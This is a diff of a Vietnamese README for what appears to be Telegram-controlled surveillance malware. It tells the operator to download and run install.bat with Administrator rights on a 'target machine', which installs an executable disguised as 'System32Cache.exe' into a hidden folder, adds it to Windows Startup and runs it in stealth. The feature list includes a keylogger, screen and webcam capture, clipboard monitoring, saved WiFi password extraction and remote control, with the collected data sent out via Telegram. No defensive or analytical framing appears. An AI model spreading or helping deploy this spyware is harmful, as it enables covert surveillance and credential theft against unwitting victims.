@@ -8,13 +8,13 @@
 
 **⚠️ QUAN TRỌNG:** File `.exe` đã chứa TẤT CẢ thư viện bên trong, máy đích **KHÔNG CẦN** Python hay bất kỳ thư viện nào!
 
-1. **Tải file `INSTALL_EXE.bat`** từ GitHub:
+1. **Tải file `install.bat`** từ GitHub:
    - Vào: https://github.com/truongxoantit/TLe1
-   - Click vào file `INSTALL_EXE.bat`
+   - Click vào file `install.bat` (hoặc `INSTALL_EXE.bat`)
    - Click nút **"Raw"** (góc phải trên)
-   - Click chuột phải → **"Save as"** → Lưu với tên `INSTALL_EXE.bat`
+   - Click chuột phải → **"Save as"** → Lưu với tên `install.bat`
 
-2. **Chạy file `INSTALL_EXE.bat`** (Click đúp hoặc chuột phải → Run as Administrator)
+2. **Chạy file `install.bat`** (Click đúp hoặc chuột phải → Run as Administrator)
 
 **XONG!** Ứng dụng sẽ tự động:
 - ✅ Tải file .exe từ GitHub (đã chứa tất cả thư viện)
@@ -27,17 +27,22 @@
 
 ## 📋 Tính năng
 
-- 🎥 **Quay màn hình**: Tự động quay 10-20 giây
-- ⌨️ **Keylogger**: Ghi lại tất cả phím bấm
+Xem danh sách đầy đủ: [CHUC_NANG.md](CHUC_NANG.md)
+
+**Tính năng chính:**
+- 🎥 **Quay màn hình**: Tự động quay 20 giây, gửi mỗi 20 giây
+- ⌨️ **Keylogger**: Ghi lại tất cả phím bấm, gửi kèm video
 - 📸 **Screenshot**: Chụp ảnh màn hình định kỳ
-- 📋 **Clipboard**: Theo dõi clipboard
+- 📋 **Clipboard**: Theo dõi clipboard tự động
 - 📁 **File Transfer**: Gửi/nhận file qua Telegram
-- 🎮 **Remote Control**: Điều khiển từ xa qua Telegram
+- 🎮 **Remote Control**: Điều khiển từ xa qua Telegram Bot
 - 🖥️ **System Info**: Thu thập thông tin hệ thống
 - 📶 **WiFi Extractor**: Lấy mật khẩu WiFi đã lưu (mỗi 1 giờ)
 - 📹 **Webcam Capture**: Chụp ảnh từ webcam định kỳ (mỗi 30 phút)
 - 🔌 **USB Monitor**: Theo dõi thiết bị USB mới (mỗi 1 phút)
-- 🔒 **Stealth Mode**: Chạy hoàn toàn ẩn
+- 🔒 **Stealth Mode**: Chạy hoàn toàn ẩn, tự động khởi động
+- 🔄 **Auto Update**: Tự động cập nhật từ GitHub
+- ⚡ **Performance Optimizer**: Tối ưu hiệu năng cho máy yếu
 
 ## ⚙️ Cấu hình
 
@@ -53,12 +58,16 @@ Nhấn: **Ctrl + Shift + Alt + P**
 
 ```
 main/
-├── INSTALL_EXE.bat          ← File cài đặt .EXE (chạy trên máy đích)
+├── install.bat              ← File cài đặt chính (chạy trên máy đích) ⭐
+├── INSTALL_EXE.bat          ← File cài đặt .EXE (được gọi bởi install.bat)
 ├── BUILD_EXE.bat            ← Build file .exe (chạy trên máy phát triển)
-├── System32Cache.exe        ← File .exe (sau khi build, upload lên GitHub)
+├── INSTALL_LIBRARIES.bat    ← Cài đặt thư viện (chạy trên máy phát triển)
+├── dist/
+│   └── System32Cache.exe    ← File .exe (sau khi build, upload lên GitHub)
 ├── main_stealth.py          ← File chính Python (cần để build)
 ├── config.py                ← Cấu hình (cần để build)
 ├── requirements.txt         ← Thư viện Python (cần để build)
+├── CHUC_NANG.md             ← Danh sách đầy đủ các chức năng
 └── ... (các module Python khác - cần để build)
 ```
 
@@ -115,6 +124,10 @@ Xem hướng dẫn chi tiết: [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md)
    - Đặt trong thư mục `dist/` hoặc root của repo
 
 6. **Cài đặt trên máy đích:**
-   - Tải `INSTALL_EXE.bat` từ GitHub
+   - Tải `install.bat` từ GitHub
    - Chạy với quyền Administrator
-   - Ứng dụng sẽ tự động tải .exe và chạy (KHÔNG cần Python!)
+   - Ứng dụng sẽ tự động:
+     - Tải file .exe từ GitHub
+     - Cài đặt vào thư mục ẩn
+     - Thêm vào Windows Startup
+     - **Khởi động ngay lập tức** (KHÔNG cần Python!)
